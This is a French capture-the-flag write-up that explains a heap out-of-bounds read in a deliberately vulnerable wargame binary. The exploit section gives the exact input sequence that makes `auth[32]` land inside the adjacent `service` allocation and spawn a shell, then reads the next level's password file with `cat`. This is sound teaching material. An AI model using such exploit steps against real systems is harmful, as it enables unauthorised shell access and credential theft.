# Level 8 — Heap: out-of-bounds read via adjacent allocation

## Main simplifié

```c
char *auth    = NULL;
char *service = NULL;

int main(void) {
    char buf[128];

    while (1) {
        printf("%p, %p \n", auth, service);

        if (fgets(buf, 128, stdin) == NULL)
            return 0;

        if (strncmp(buf, "auth ", 5) == 0) {
            auth = malloc(4);
            memset(auth, 0, 4);
            if (strlen(buf + 5) <= 30)
                strcpy(auth, buf + 5);
        }

        if (strncmp(buf, "reset", 5) == 0)
            free(auth);

        if (strncmp(buf, "service", 7) == 0)
            service = strdup(buf + 7);

        if (strncmp(buf, "login", 5) == 0) {
            if (auth[32] == 0)
                fwrite("Password:\n", 1, 10, stdout);
            else
                system("/bin/sh");
        }
    }
}
```

## Vulnérabilité

`auth` est alloué avec `malloc(4)` (4 octets).  
La condition de victoire lit `auth[32]` — soit **28 octets au-delà** de la zone allouée.  
`service = strdup(input)` est alloué juste après `auth` sur la heap.  
Si `service` est assez long, `auth[32]` tombe dans les données de `service` et est non nul → shell.

## Commandes disponibles

| commande | effet |
|---|---|
| `auth <str>` | `malloc(4)` + `strcpy(auth, str)` si len ≤ 30 |
| `reset` | `free(auth)` |
| `service <str>` | `service = strdup(str)` |
| `login` | si `auth[32] != 0` → `system("/bin/sh")`, sinon "Password:" |

Le programme affiche `auth` et `service` à chaque tour — utile pour calculer la distance.

## Distance heap

```
auth    = 0x804a008   (malloc 4 octets → chunk 16 octets)
service = 0x804a018   (strdup → chunk juste après)
distance = 0x10 = 16 octets
```

`auth[32]` = `service[16]`

## Exploit

```bash
auth           # malloc(4) pour auth
service AAAAAAAAAAAAAAA   # 15 'A' + \n de fgets = 17 octets → service[16] = '\n' ≠ 0
login          # auth[32] = service[16] = '\n' → shell
cat /home/user/level9/.pass
```

## Pourquoi 15 caractères exactement ?

`fgets` garde le `\n` dans le buffer → strdup reçoit `" " + 15×'A' + '\n'` = 17 octets.  
`service[16]` = `'\n'` (non nul) → `auth[32]` est non nul → victoire.  
Avec 14 chars, `service[16]` = `'\0'` → échec.

## À retenir

- `malloc(N)` alloue un chunk de taille `N` arrondi, le suivant est alloué juste après.
- Lire au-delà d'une allocation (`auth[32]`) lit dans la heap adjacente — pas de segfault si la page est mappée.
- `fgets` inclut le `\n` : il compte dans la longueur du strdup.
- Ne pas retaper `auth` plusieurs fois sans `reset` : ça avance la heap et casse la distance.
